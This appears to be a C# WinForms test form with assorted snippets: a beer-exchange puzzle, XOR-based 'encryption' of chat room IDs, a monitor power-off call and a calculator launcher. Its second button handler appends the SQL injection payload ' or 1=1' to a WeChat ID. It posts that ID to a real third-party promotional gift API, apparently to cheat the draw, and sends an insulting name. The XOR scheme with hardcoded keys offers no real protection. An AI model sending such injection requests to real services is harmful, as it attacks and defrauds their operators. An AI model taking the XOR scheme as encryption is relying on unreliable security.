using eT.Common;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;


namespace equipmentTest
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            //MessageBox.Show(dtManagers.Rows[0]["userid"].ToString());
        }

        #region 2元钱可以买一瓶啤酒,4个瓶盖可以兑换一瓶啤酒,2个空瓶可以兑换一瓶啤酒,10元钱可以喝多少瓶啤酒?
        private static void changeBeer()
        {
            //兑换
            numGai += num;
            numBott += num;
            total += num;
            //兑换后清零
            num = 0;

            num += numGai / 4; //盖子商
            numGai = numGai % 4;//盖子余数
            
            num += numBott / 2;
            numBott = numBott % 2;
            
            if (num>0)
                changeBeer();
            else
                MessageBox.Show(total.ToString());
        }

        private static int numGai=0;
        private static int numBott=0;
        private static int num=5;
        private static int total=0;
        #endregion
        private const int roomKey = 891011;
        private const int attrKey = 670;
        //生成加密的房间号
        private string encryptRoomNum(int hosterid, int memberid)
        {
            //1:接收者和发起者id从小到大排序
            ArrayList arr = new ArrayList();
            arr.Add(hosterid);
            arr.Add(memberid);
            arr.Sort();
            string roomName = "";
            for (int i = 0; i < arr.Count; i++)
            {
                arr[i] = Convert.ToInt32(arr[i]) ^ roomKey;
                roomName = roomName + arr[i].ToString() + '‎';
            }
            roomName = roomName.TrimEnd('‎');
            return roomName;
        }
        //生成加密参数
        private string encryptRoomAttr(int hosterid, int memberid)
        {
            string roomName = "";
            roomName = roomName + (hosterid ^ attrKey).ToString() + '‎';
            roomName = roomName + (memberid ^ attrKey).ToString();
            return roomName;
        }
        private string getChatAttrs(int hosterid, int memberid)
        {
            return encryptRoomNum(hosterid, memberid) + '‎' + encryptRoomAttr(hosterid, memberid);
        }

        //解密房间参数
        private ArrayList decryptRoomAttr(string roomattr)
        {
            var a = roomattr.Split('‎');
            var result = new ArrayList();
            for (int i = 0; i < a.Length; i++)
            {
                if (i <= 1)
                    result.Add(Convert.ToInt32(a[i]) ^ roomKey);
                else if (i > 1 && i <= 3)
                    result.Add(Convert.ToInt32(a[i]) ^ attrKey);
            }
            return result;
        }

        private void button1_Click(object sender, EventArgs e)
        {

            //changeBeer();

            //closeMonitor(); //关闭显示器
            string aaaa = getChatAttrs(75063,75062);
            MessageBox.Show(aaaa);
            ArrayList aaa = decryptRoomAttr(aaaa);
            for(int i = 0; i < aaa.Count; i++)
            {
                MessageBox.Show(aaa[i].ToString());
            }
            /*
            EnvironmentVariable ev = new EnvironmentVariable();
            ev.ilvl = 55;
            Item eqpt = Generator.generateEquipment(ev);
            //eqpt.AffixList

            eqpt.Execute();
            */



            /*
            EquipmentSingle equipment = new EquipmentSingle(Convert.ToInt32(txtLevel.Text),EquipmentSingle.EquipmentTypeEnum.Armor);
            Random rd = new Random();
            string str = "";
            str = equipment.name + "\n";
            for(int i=0;i<equipment.affixList.Count;i++){
                str +="+"+equipment.affixList[i].attribute.minValue + "-" + equipment.affixList[i].attribute.maxValue + " " + equipment.affixList[i].attribute.AttributeType + "\n";
            }

            lbEquipmentName.Text = str;
             */


        }

        #region 关闭显示屏
        //系统消息 
        private const uint WM_SYSCOMMAND = 0x112;
        //关闭显示器的系统命令   
        private const int SC_MONITORPOWER = 0xF170;
        //2为PowerOff, 1为省电状态，-1为开机 
        private const int MonitorPowerOff = 2;
        //广播消息，所有顶级窗体都会接收
        private static readonly IntPtr HWND_BROADCAST = new IntPtr(0xffff);
        //导入API函数库,以下用到的函数SendMessage(...)就在user32.dll文件中
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        //此方法的各个参数类型有一些重载，一般还是建议用IntPtr,否则，在64位平台OR其它情况下可能会崩溃
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
        //关闭显示器函数
        public static void closeMonitor()
        {
            //SendMessage(this.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, MonitorP     owerOff);    //GUI程序用这行
            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MonitorPowerOff);   //CUI程序用这行  
        }

        #endregion

        #region 调用操作系统计算器

        [System.Runtime.InteropServices.DllImport("User32.dll")]
        private static extern bool ShowWindowAsync(IntPtr hWnd, int cmdShow);
        [System.Runtime.InteropServices.DllImport("User32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
        private const int WS_SHOWNORMAL = 3;
        private void callCalc()
        {
            Process[] ps = Process.GetProcessesByName("calc");
            Process p_calc = null;
            foreach (Process p in ps)
            {
                if (p.MainModule.ModuleName == "calc.exe")
                {
                    p_calc = p;
                    break;
                }
            }

            if (ps.Length > 0)
            {
                ShowWindowAsync(p_calc.MainWindowHandle, 1);
                SetForegroundWindow(p_calc.MainWindowHandle);
            }
            else
            {
                p_calc = Process.Start("calc.exe");
            }
        }

        #endregion 调用操作系统计算器



        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                string wechatId = "";
                for (int i = 0; i < groupBox1.Controls.Count; i++)//将它们放入容器里
                {
                    if (groupBox1.Controls[i] is RadioButton)
                    {
                        RadioButton temp = (RadioButton)groupBox1.Controls[i];
                        if (temp.Checked)//判断是否选中
                            wechatId = temp.Tag.ToString()+" or 1=1";//这个可以自己改
                    }
                }

                string resultStartgame = new WebUtils().DoPost("http://www.snsads3.com/ptp/pickgift/startGame", string.Format("activityId={0}&wechatid={1}", "109402", wechatId));
                JObject obj2 = JsonConvert.DeserializeObject(resultStartgame) as JObject;
                string code = obj2["code"].ToString();
                string _t = obj2["_t"].ToString();
                button2.Text = "處理中..";
                Thread.Sleep(1000);
                string resultSavescore = new WebUtils().DoPost("http://www.snsads3.com/ptp/pickgift/saveUserinfo", string.Format("activityId={0}&wechatid={1}&user_tel={2}&user_name={3}", "109402", wechatId, txt_Tel.Text, "抱歉,在座的各位都是垃圾"));
                JObject obj3 = JsonConvert.DeserializeObject(resultSavescore) as JObject;
                MessageBox.Show(obj3["status"].ToString());
            }
            catch(Exception ex)
            {
                MessageBox.Show("会不会操作?傻逼!" + ex.Message);
            }
            
        }







    }
}
